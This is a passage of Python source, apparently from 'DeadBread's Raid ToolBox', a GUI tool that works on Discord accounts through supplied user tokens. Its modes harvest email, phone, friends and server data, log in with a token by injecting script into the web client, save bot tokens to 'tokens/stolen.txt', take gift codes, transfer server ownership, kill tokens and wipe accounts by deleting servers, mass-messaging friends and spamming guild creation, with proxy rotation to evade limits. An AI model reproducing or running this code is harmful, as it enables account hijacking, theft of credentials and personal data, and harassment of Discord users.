    request = requests.Session()
    sg.PopupNonBlocking("Please Wait...", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
    while True:
        try:
            src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, proxies=proxies, timeout=10)
        except Exception:
            if use_proxies == 1:
                proxies = request_new_proxy()
            else:
                break
        else:
            break
    response = json.loads(src.content)
    try:
        info = f"Name: {response['username']}#{response['discriminator']}\nID: {response['id']}\nEmail: {response['email']}\nPhone: {response['phone']}\nLanguage: {response['locale']}\n"
    except Exception:
        sg.Popup("Unable to get info on token.", title="Error", icon=rtb_icon)
    else:
        lay = [
            [sg.Multiline(info, size=(50,10))],
            [sg.Button("Export")]
        ]
        try:
            window = sg.Window(f"Information on {response['username']}", icon=rtb_icon, keep_on_top=True).Layout(lay)
        except Exception:
            with open(f"users/{response['username']}.txt", "w+", errors='ignore') as handle:
                handle.write(info)
        event, values = window.Read()
        if event is None or event == 'Exit':
            pass
        elif event == "Export":
            if not os.path.isdir("users"):
                os.mkdir("users")
            with open(f"users/{response['username']}.txt", "w+", errors='ignore') as handle:
                handle.write(info)
                sg.Popup(f"Exported info for {response['username']} to files/{response['username']}.txt", title="Exported", icon=rtb_icon)

elif mode == "HeavyInfo":
    if use_proxies == 1:
        sg.Popup("This attack does not use proxies. This will use your own IP.", title="Caution.")
    sg.PopupNonBlocking("This may take a while.", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
    import discord
    import unicodedata
    import string
    token = sys.argv[6]
    client = discord.Client()
    valid_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
    valid_filename_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
    char_limit = 255
    def clean_filename(filename, whitelist=valid_filename_chars, replace=' '):
        for r in replace:
            filename = filename.replace(r,'_')
        cleaned_filename = unicodedata.normalize('NFKD', filename).encode('ASCII', 'ignore').decode()
        cleaned_filename = ''.join(c for c in cleaned_filename if c in whitelist)
        return cleaned_filename[:char_limit]
    @client.event
    async def on_ready():
        fn = clean_filename(client.user.name)
        headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers)
        response = json.loads(src.content)
        if not os.path.exists("users"):
            os.mkdir('users')
        with open ('users/{}_HEAVY.txt'.format(client.user.name),'w+',errors='ignore') as handle:
            handle.write('====================================\n')
            handle.write('Token: '+token+'\n')
            handle.write('Email: '+str(client.user.email)+'\n')
            handle.write('Phone: '+str(response['phone'])+'\n')
            handle.write('Username: '+client.user.name+'#'+client.user.discriminator+'\n')
            handle.write('User ID: '+str(client.user.id)+'\n')
            handle.write('Locale: '+str(client.user.locale)+'\n')
            handle.write('Created on: '+str(client.user.created_at)+'\n')
            handle.write('Verified: '+str(client.user.verified)+'\n')
            handle.write('MFA Enabled: ' + str(client.user.mfa_enabled)+'\n')
            handle.write('Discord Nitro: '+str(client.user.premium)+'\n')
            handle.write('Discord Nitro Type: '+str(client.user.premium_type)+'\n')
            handle.write('Avatar URL: '+str(client.user.avatar_url)+'\n')
            handle.write('====================================\n')
            handle.write('Member of '+str(len(client.guilds))+' servers.\n')
            handle.write('User has '+str(len(client.user.friends))+' friends.\n')
            handle.write('User has blocked '+str(len(client.user.blocked))+' people.\n')
            handle.write('====================================\nFriends:\n====================================\n')
            if len(client.user.friends) == 0:
                handle.write('None.\n\n')
            else:
                for friend in client.user.friends:
                    handle.write('Name: '+str(friend.name)+'#'+str(friend.discriminator)+'\n')
                    handle.write('ID: '+str(friend.id)+'\n\n')
            handle.write('====================================\nBlocked Users:\n====================================\n')
            if len(client.user.blocked) == 0:
                handle.write('None.\n\n')
            else:
                for block in client.user.blocked:
                    handle.write('Name: '+str(block.name)+'#'+str(block.discriminator)+'\n')
                    handle.write('ID: '+str(block.id)+'\n\n')
            handle.write('====================================\nServers:\n====================================\n')
            if len(client.guilds) == 0:
                handle.write('None.\n\n')
            else:
                for server in client.guilds:
                    handle.write('Name: '+server.name+'\n')
                    handle.write('ID: '+str(server.id)+'\n')
                    if server.owner.id == client.user.id:
                        serverowner = True
                    else:
                        serverowner = False
                    for channel in server.text_channels:
                        myperms = channel.permissions_for(server.get_member(client.user.id))
                        break
                    handle.write('Member Count: ' + str(len(server.members))+'\n')
                    handle.write('Channel Count: '+str(len(server.channels))+'\n')
                    handle.write('Role Count: '+str(len(server.roles))+'\n')
                    handle.write('Owner: '+str(serverowner)+'\n')
                    handle.write('Admin: '+str(myperms.administrator)+'\n\n')
            handle.write('====================================\n')
        try:
            await client.close()
            sg.Popup("Heavy Info Gather is complete.",title="Complete")
        except Exception:
            pass
    client.run(token, bot=False)

elif mode == "Terminator":
    headers, proxies = setup_request(sys.argv[6])
    request = requests.Session()
    del headers['Content-Type']
    del headers['User-Agent']
    sg.PopupNonBlocking("Terminating Token...", title="Bye Bye Token :)", auto_close=True, auto_close_duration=3)
    while True:
        try:
            src = request.post("https://"+endpoint+"discord.com/api/v8/invite/fortnite", headers=headers, proxies=proxies, timeout=5)
        except Exception as e:
            if use_proxies == 1:
                proxies = request_new_proxy()
            else:
                print(e)
                break
        else:
            if src.status_code == 401:
                break
            else:
                continue
    sg.Popup("Token Appears to not work anymore ;)", title="Terminated")

elif mode == "CG":
    headers, proxies = setup_request(sys.argv[6])
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'enable_tts_command': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    while True:
        try:
            request.patch("https://"+endpoint+"discord.com/api/v8/users/@me/settings",headers=headers, json=payload, proxies=proxies, timeout=10)
        except Exception:
            if use_proxies == 1:
                proxies = request_new_proxy()
            else:
                break
        else:
            break
    locales = [  # Thanks https://github.com/iLinked1337
        "da", "de",
        "en-GB", "en-US",
        "es-ES", "fr",
        "hr", "it",
        "lt", "hu",
        "nl", "no",
        "pl", "pt-BR",
        "ro", "fi",
        "sv-SE", "vi",
        "tr", "cs",
        "el", "bg",
        "ru", "uk",
        "th", "zh-CN",
        "ja", "zh-TW",
        "ko"
        ]
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://"+endpoint+"discord.com/api/v8/users/@me/settings",headers=headers, json=setting, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break

elif mode == "Ownership":
    request = requests.Session()
    lay = [
        [sg.Text('Server ID',size=(10,1)), sg.Input(key="ServerID")],
        [sg.Text('New Owner ID',size=(10,1)), sg.Input(key="OwnerID")],
        [sg.Button("Transfer")]
    ]
    window = sg.Window("Transfer Ownership", icon=rtb_icon).Layout(lay)
    event, values = window.Read()
    if event is None:
        pass
    else:
        headers, proxies = setup_request(sys.argv[6])
        payload = {'owner_id': values['OwnerID']}
        while True:
            try:
                src = request.patch(f"https://ptb.discord.com/api/guilds/{values['ServerID']}", headers=headers, json=payload, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        sg.Popup("Ownership Should have been transferred.")

elif mode == "Logintoken":
    from selenium import webdriver
    profile = webdriver.FirefoxProfile()
    profile.set_preference("general.useragent.override", 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36')
    driver = webdriver.Firefox(profile)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://"+endpoint+"discord.com/login")
    driver.execute_script(script+f'\nlogin("{sys.argv[6]}")')

elif mode == "DDDC":
    if use_proxies == 1:
        sg.Popup("This attack does not use proxies. This will use your own IP.", title="Caution.")
    import discord
    import asyncio
    import re
    token = sys.argv[6]
    client = discord.Client()
    @client.event
    async def on_message(message):
        number = random.randint(1,51)
        if 'sayori' in message.content.lower() and message.author == client.user:
            if random.randint(1,3) == 1:
                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/ŞêýåŅĶäûų.png"))
                await asyncio.sleep(0.7)
                await file.delete()
            gtext = []
            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
            for char in text:
                gtext.append(char)
            dokitext = ''
            for x in range(15):
                gchar = random.choice(gtext)
                dokitext += gchar
            text = message.content.lower()
            text = re.sub(r'sayori', dokitext, text)
            try:
                await message.edit(content=str(text))
            except Exception as e:
                print (e)

        if number == 50 and message.author == client.user:
            glitchy = ""
            for x in range(1000):
                num = random.randrange(9999)
                glitchy = glitchy + chr(num)
            try:
                await message.edit(content=str(glitchy))
                await asyncio.sleep(random.randint(1,11))
                await message.delete()
            except Exception as e:
                print (e)

        if 'monika' in message.content.lower() and message.author == client.user:
            monika = "JUST MONIKA"
            for char in monika:
                try:
                    await message.edit(content=str(char))
                    await asyncio.sleep(1)
                except Exception as e:
                    print (e)
            mon = ''
            for char in monika:
                mon += char
                try:
                    await message.edit(content=str(mon))
                    await asyncio.sleep(1)
                except Exception as e:
                    print (e)
            gtext = []
            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
            for char in text:
                gtext.append(char)
            for x in range(3):
                dokitext = ''
                for x in range(15):
                    gchar = random.choice(gtext)
                    dokitext += gchar
                await message.edit(content=str(dokitext))
            await message.delete()

        if 'happy' in message.content.lower() and message.author == client.user:
            if random.randint(1,3) == 1:
                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/HAPPY.jpg"))
                await asyncio.sleep(random.randint(1,11))
                await file.delete()

        if number == 18 and message.author == client.user:
            original = str(message.content)
            monika = ('**JUST**','**MONIKA**','**JUST MONIKA**','**Mo**','**nika**','**Ju**','**st**')
            glitchy = ""
            for x in range(300):
                num = random.randrange(9999)
                if random.randint(1,3) == 1:
                    glitchy = glitchy + random.choice(monika)
                glitchy = glitchy + chr(num)
            try:
                await asyncio.sleep(1)
                await message.edit(content=str(glitchy))
                await asyncio.sleep(random.randint(1,11))
                await message.edit(content=str(original))
            except Exception:
                pass

        if number == 21 and message.author == client.user:
            files = ["RTBFiles/DDDC/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii.txt","RTBFiles/DDDC/hxppy thxughts.png","RTBFiles/DDDC/CAN YOU HEAR ME.txt","RTBFiles/DDDC/monika.chr","RTBFiles/DDDC/traceback.txt"]
            gtext = []
            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
            for char in text:
                gtext.append(char)
            for x in range(3):
                dokitext = ''
                for x in range(15):
                    gchar = random.choice(gtext)
                    dokitext += gchar
            file = await message.channel.send(content=str(dokitext), file=discord.File(random.choice(files)))
            await asyncio.sleep(random.randint(1,21))
            await file.delete()
    client.run(token, bot=False)

elif mode == "Gifts":
    sg.PopupNonBlocking("Please Wait...", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
    gifts = {}
    headers, proxies = setup_request(sys.argv[6])
    request = requests.Session()
    while True:
        try:
            src = request.get("https://"+endpoint+"discord.com/api/v8/users/@me/entitlements/gifts", headers=headers, proxies=proxies, timeout=10)
        except Exception:
            if use_proxies == 1:
                proxies = request_new_proxy()
            else:
                break
        else:
            break
    s = json.loads(src.content)
    for app in s:
        gifts[app["subscription_plan"]["name"]] = str({"sku_id": app["sku_id"], "id": app["subscription_plan"]["id"]})
    layout = [
        [sg.Text("Available Gifts")]
    ]
    for g in gifts:
        layout.append([sg.Text(g, size=(50,1)), sg.Button("Take",key=g)])
    if len(list(g)) == 0:
        layout.append([sg.Text("None")])
    window = sg.Window("DeadBread's Raid ToolBox | Gift Inventory", icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            break
        elif event in list(gifts):
            g = ast.literal_eval(gifts[event])
            payload = {"sku_id": g['sku_id'],"subscription_plan_id": g["id"]}
            src = request.post("https://"+endpoint+"discord.com/api/v8/users/@me/entitlements/gift-codes", headers=headers, json=payload, proxies=proxies, timeout=10)
            f = json.loads(src.content)
            if f['code'] == 30022:
                sg.Popup("Maximum number of gifts has been reached for this SKU.", title="Code 30022")
            else:
                sg.PopupScrolled("https://discord.gift/{}".format(f['code']))
                with open("GIFT_CODES.txt", "a+") as handle:
                    handle.write("https://discord.gift/{}\n".format(f['code']))

elif mode == "AppList":
    sg.PopupNonBlocking("Please Wait...", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
    headers, proxies = setup_request(sys.argv[6])
    while True:
        try:
            src = request.get("https://"+endpoint+"discord.com/api/v8/oauth2/applications?with_team_applications=true", headers=headers, proxies=proxies, timeout=10)
        except Exception:
            if use_proxies == 1:
                proxies = request_new_proxy()
            else:
                break
        else:
            break
    apps = json.loads(src.content)
    tokens = list()
    headings = ['Name', 'Discriminator', 'ID','Token']
    header =  [[sg.Text('  ')] + [sg.Text(h, size=(13,1)) for h in headings]]
    input_rows = []
    for app in apps:
        try:
            app["bot"]
        except:
            pass
        else:
            bot = app["bot"]
            tokens.append(bot['token'])
            input_rows.append([sg.Input(bot['username'], disabled=False, size=(15,1)), sg.Input(bot['discriminator'], disabled=False, size=(15,1)), sg.Input(bot['id'], disabled=False, size=(15,1)), sg.Input(bot['token'], disabled=False, size=(25,1))])
    layout = header + input_rows
    layout.append([sg.Button("Save all tokens")])
    window = sg.Window("RTB | Token Bots", icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            sys.exit()
        elif event == "Save all tokens":
            with open("tokens/stolen.txt", "a+") as handle:
                for token in tokens:
                    handle.write(token+"\n")

elif mode == "CustomConnection":
    headers, proxies = setup_request(sys.argv[6])
    request = requests.Session()
    appkey = {
        'Leauge of Legends': "leagueoflegends",
        'Battle.net': "battlenet",
        'Skype': "skype"
    }
    layout = [
        [sg.Text("Type", size=(17,1)), sg.Text("Name", size=(17,1)), sg.Text("ID", size=(15,1))],
        [sg.Combo(['Leauge of Legends', 'Battle.net', 'Skype'], size=(16,1), key="TYPE", readonly=True), sg.Input("Name", size=(20,1), key="NAME"), sg.Input("ID", size=(15,1), key="ID")],
        [sg.Button("Create Connection")]
    ]
    window = sg.Window("RTB | Custom Connections", icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            sys.exit()
        elif event == 'Create Connection':
            type = values["TYPE"]
            payload = {"name": values['NAME'], "visibility": 1}
            while True:
                try:
                    src = request.put(f"https://{endpoint}discord.com/api/v8/users/@me/connections/{appkey[type]}/{values['ID']}", headers=headers, json=payload, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            sg.Popup("Created Custom Connection.", keep_on_top=True)

elif mode == "FR Clearer":
    headers, proxies = setup_request(sys.argv[6])
    request = requests.Session()
    def delete(userid):
        headers, proxies = setup_request(sys.argv[6])
        while True:
            payload = {"type": 2}
            try:
                src = request.put(f"https://{endpoint}discord.com/api/v8/users/@me/relationships/{userid}", headers=headers, json=payload, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
    while True:
        try:
            src = request.get("https://"+endpoint+"discord.com/api/v8/users/@me/relationships", headers=headers, proxies=proxies, timeout=10)
        except Exception:
            if use_proxies == 1:
                proxies = request_new_proxy()
            else:
                break
        else:
            break
    relations = json.loads(src.content)
    for relation in relations:
        if relation['type'] == 3:
            executor.submit(delete, relation['id'])

elif mode == "LoginBot":
    from selenium import webdriver
    profile = webdriver.FirefoxProfile()
    profile.set_preference("general.useragent.override", f'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36')
    driver = webdriver.Firefox(profile)
    driver.get("https://"+endpoint+"discord.com/login")
    script = """
    function launchbot(token) {
      ((i) => {
        window.webpackJsonp.push([
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'None';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ # Modified version of this code: https://pastebin.com/Fn9EYNLa, thank you whoever made the original.
    driver.execute_script(script+f'\nlaunchbot("Bot {sys.argv[6]}")')

elif mode == "Annihilator": # China be like
    import traceback
    request = requests.Session()
    def glitch_client():
        headers, proxies = setup_request(sys.argv[6])
        payload = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'enable_tts_command': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "invisible"
        }
        while True:
            try:
                request.patch("https://"+endpoint+"discord.com/api/v8/users/@me/settings",headers=headers, json=payload, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        locales = [  # Thanks https://github.com/iLinked1337
            "da", "de",
            "en-GB", "en-US",
            "es-ES", "fr",
            "hr", "it",
            "lt", "hu",
            "nl", "no",
            "pl", "pt-BR",
            "ro", "fi",
            "sv-SE", "vi",
            "tr", "cs",
            "el", "bg",
            "ru", "uk",
            "th", "zh-CN",
            "ja", "zh-TW",
            "ko"
            ]
        modes = cycle(["light", "dark"])
        statuses = cycle(["online", "idle", "dnd", "invisible"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(locales),
                'status': next(statuses)
            }
            while True:
                try:
                    request.patch("https://"+endpoint+"discord.com/api/v8/users/@me/settings",headers=headers, json=setting, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break

    def change_avatar(avatar):
        headers, proxies = setup_request(sys.argv[6])
        while True:
            try:
                src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break
        username = src.json()['username']
        email = src.json()['email']
        with open(avatar, "rb") as avatar_handle:
            encoded = bytes_to_base64_data(avatar_handle.read())
        payload = {
            'avatar': encoded,
            'email': email,
            'password': '',
            'username': username
        }
        while True:
            try:
                src = request.patch('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, json=payload, proxies=proxies, timeout=20)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break

    def delete_guild(id):
        headers, proxies = setup_request(sys.argv[6])
        while True:
            try:
                src = request.delete(f'https://{endpoint}discord.com/api/v8/guilds/{id}', headers=headers, proxies=proxies, timeout=20)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break

    def leave_guild(id):
        headers, proxies = setup_request(sys.argv[6])
        while True:
            try:
                src = request.delete(f'https://{endpoint}discord.com/api/v8/users/@me/guilds/{id}', headers=headers, proxies=proxies, timeout=20)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break

    def remove_friend(id):
        headers, proxies = setup_request(sys.argv[6])
        while True:
            try:
                src = request.delete(f"https://{endpoint}discord.com/api/v8/users/@me/relationships/{id}", headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break

    def create_guild(name, encoded):
        headers, proxies = setup_request(sys.argv[6])
        payload = {"name": name, "icon": encoded}
        while True:
            try:
                src = request.post(f'https://{endpoint}discord.com/api/v8/guilds', headers=headers, json=payload, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break

    def dm_and_close(id, text):
        headers, proxies = setup_request(sys.argv[6])
        payload = {
            "content" : text
        }
        while True:
            try:
                src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{id}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        while True:
            try:
                src = request.delete(f"https://{endpoint}discord.com/api/v8/channels/{id}", headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                if src.status_code == 429:
                    time.sleep(src.json()['retry_after'])
                    continue
                else:
                    break

    def start_annihilate(values):
        global window
        headers, proxies = setup_request(sys.argv[6])
        executor.submit(change_avatar, values['PFP'])
        if values['PassProtect']:
            threading.Thread(target=glitch_client, daemon=True).start()
        with ThreadPoolExecutor(max_workers=4) as exe:
            while True:
                try:
                    src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me/guilds', headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            print("Leaving all servers...")
            for guild in src.json():
                if guild['owner']:
                    exe.submit(delete_guild, guild['id'])
                else:
                    exe.submit(leave_guild, guild['id'])

        with ThreadPoolExecutor(max_workers=4) as exe:
            while True:
                try:
                    src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me/channels', headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            print("Sending and closing DMs...")
            for dm in src.json():
                exe.submit(dm_and_close, dm['id'], values['Message'])

        with ThreadPoolExecutor(max_workers=4) as exe:
            while True:
                try:
                    src = request.get("https://"+endpoint+"discord.com/api/v8/users/@me/relationships", headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            print("Removing Friends...")
            for relation in src.json():
                exe.submit(remove_friend, relation['id'])
        with ThreadPoolExecutor(max_workers=4) as exe:
            print("Creating Guilds...")
            with open(values['PFP'], "rb") as icon_handle:
                encoded = bytes_to_base64_data(icon_handle.read())
            for x in range(100):
                exe.submit(create_guild, values['SerName'], encoded)
        print("Account got annihilated")
        time.sleep(1)
        window['Annihilate'].Update(disabled=False)

    layout = [
        [sg.Text("New profile/server picture:", size=(18,1)), sg.Input(key="PFP"), sg.FileBrowse()],
        [sg.Text("Created Servers Name:", size=(18,1)), sg.Input(key="SerName")],
        [sg.Text("Message to send to friends:")],
        [sg.Multiline(key="Message")],
        [sg.Text("Password Change Protection:"), sg.Checkbox("", default=False, key="PassProtect")],
        [sg.Button("Annihilate", size=(15,1))],
        [sg.Output(size=(75,10), visible=False, key="Output")]
    ]
    window = sg.Window("RTB | Account Annihilator", icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read(timeout=50)
        if event is None:
            os.kill(os.getpid(), 9)
        elif event == "Annihilate":
            window['Output'].Update(visible=True)
            window['Annihilate'].Update(disabled=True)
            try:
                threading.Thread(target=start_annihilate, args=[values], daemon=True).start()
            except Exception as e:
                print(e)


elif mode == "ProxyScraper":
    import re
    printqueue = []
    checking = False
    scraping = False
    finished = 0
    links = []
    request = requests.Session()
    proxyregex = "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,4}" # Really happy with this for some reason
    def scrape_link(link, linkno, linkslen):
        global proxies
        global finished
        try:
            printqueue.append(f"Checking Link {linkno}/{linkslen}")
            try:
                src = request.get(link, timeout=5)
            except:
                printqueue.append(f"Error Scraping {link}")
                sys.exit()
            prox = re.findall(proxyregex, src.text)
            for proxy in prox:
                if proxy in proxies:
                    continue
                else:
                    proxies.append(proxy)
            printqueue.append(f"Found {len(prox)} proxies on {link} ({len(proxies)} total.)")
        except Exception as e:
            printqueue.append(e)
        finished += 1

    def scrape_proxies():
        global proxies
        global links
        global scraping
        global finished
        if not os.path.isdir("proxies"):
            os.mkdir("proxies")
        proxies = []
        links = request.get("https://gist.githubusercontent.com/DeadBread76/608c733168cb808783d2024def3ea736/raw/db2d029485647a1033b07551453de47d8f9ed75e/Proxy%2520Sources%2520(Stolen%2520from%2520Proxyscrape%2520Scraper%2520lol).txt").text.split("\n")
        linkno = 0
        scraping = True
        name = datetime.now().strftime("%m-%d-%Y %H-%M-%S")
        printqueue.append("Started Scraping!")
        with ThreadPoolExecutor(max_workers=200) as exe:
            for link in links:
                linkno += 1
                exe.submit(scrape_link, link, linkno, len(links))
        printqueue.append("Writing to file...")
        with open(f"proxies/{name}.txt", "w+") as handle:
            for proxy in proxies:
                handle.write(f"{proxy}\n")
        printqueue.append("Wrote Proxies to file")
        printqueue.append(f'Done Scraping! You can now check them by selecting the text file in proxies/{name}.txt')
        scraping = False

    def check_proxy(proxy, timeout, list, proxy_type):
        global working
        global dead
        try:
            try:
                proxies = {
                    'http': f'{proxy_type}://{proxy}',
                    'https': f'{proxy_type}://{proxy}'
                }
                request.get("https://www.google.com/", timeout=timeout, proxies=proxies)
            except Exception:
                printqueue.append(f"[{proxy}]: Dead or timed out.")
                dead += 1
            else:
                printqueue.append(f"[{proxy}]: Working")
                working += 1
                name = list.split("/")[-1].split(".")[0]
                with open(f"proxies/{name}-{proxy_type}-working.txt", "a+") as handle:
                    handle.write(f"{proxy}\n")
        except Exception as e:
            printqueue.append(e)

    def check_proxies(timeout, list, threads, proxy_type):
        global checking
        global proxylist
